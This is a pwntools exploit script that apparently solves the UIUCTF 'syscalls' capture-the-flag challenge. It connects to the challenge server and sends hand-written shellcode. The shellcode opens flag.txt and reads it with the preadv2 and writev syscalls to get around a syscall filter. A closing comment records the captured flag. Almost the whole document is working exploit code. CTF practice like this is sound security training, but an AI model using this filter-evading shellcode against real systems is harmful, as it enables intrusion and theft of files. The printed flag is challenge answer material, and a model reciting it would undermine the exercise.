#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./syscalls_patched")

context.binary = exe

REMOTE_NC_CMD    = "nc syscalls.chal.uiuc.tf 1337"    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode parent
set follow-exec-mode same
"""

def conn():
    if args.LOCAL:
        return process([exe.path])
    
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
    
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]), ssl=True)

def main():
    r = conn()

    shellcode = ""

    shellcode += shellcraft.pushstr("flag.txt", True)
    shellcode += shellcraft.openat(-100, "rsp",0,0)

    #preadv2
    #writev

    shellcode += """
            mov rdi, rax
            mov rax, 327
            xor r10, r10
            xor r8, r8
            xor r9, r9
            mov rdx, 1
            mov [rsp], rsp
            mov rbx, 64
            mov [rsp+8], rbx
            syscall

            mov rax, 20
            mov rdi, 0x100000001
            pop rbx
            push rbx
            push rbx
            push rbx
            mov [rsp], rsp
            mov rbx, 16
            add [rsp], rbx
            mov rbx, 64
            mov [rsp+8], rbx
            mov rsi, rsp
            syscall
    """
    r.sendline(asm(shellcode))

    r.interactive()
    #uiuctf{a532aaf9aaed1fa5906de364a1162e0833c57a0246ab9ffc}

if __name__ == "__main__":
    main()